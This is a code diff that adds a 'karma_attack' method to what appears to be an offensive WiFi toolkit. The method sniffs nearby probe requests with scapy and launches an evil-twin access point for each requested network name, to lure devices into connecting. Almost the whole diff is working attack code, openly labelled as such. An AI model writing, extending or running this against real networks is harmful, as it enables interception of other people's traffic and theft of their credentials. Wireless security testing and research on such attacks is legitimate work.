@@ -131,6 +131,25 @@ class WiFiOperator:
 
         threading.Thread(target=run_coordinated_attack, daemon=True).start()
 
+    def karma_attack(self):
+        """😈 Automatically respond to any SSID being searched for (Probe Requests)."""
+        from scapy.all import sniff as scapy_sniff
+        console.print("[bold red]😈 Karma Attack Active:[/] Responding to all nearby Probe Requests...")
+        
+        seen_probes = set()
+
+        def karma_cb(pkt):
+            if pkt.haslayer(Dot11Beacon) is False and pkt.haslayer(Dot11Elt) and pkt.type == 0 and pkt.subtype == 4:
+                # Type 0 Subtype 4 = Probe Request
+                ssid = pkt.info.decode(errors='ignore')
+                if ssid and ssid not in seen_probes:
+                    console.print(f"[bold yellow]✨ Luring device:[/] Found request for [cyan]{ssid}[/], cloning AP...")
+                    seen_probes.add(ssid)
+                    # Start a background beacon for this specific SSID to attract the device
+                    threading.Thread(target=self.evil_twin, args=(ssid, pkt.addr2), daemon=True).start()
+
+        scapy_sniff(iface=self.interface, prn=karma_cb, stop_filter=lambda _: self.stop_event.is_set(), store=False)
+
     def stop(self):
         self.stop_event.set()
         console.print("[bold yellow]⏹ WiFi operation stopped.[/]")
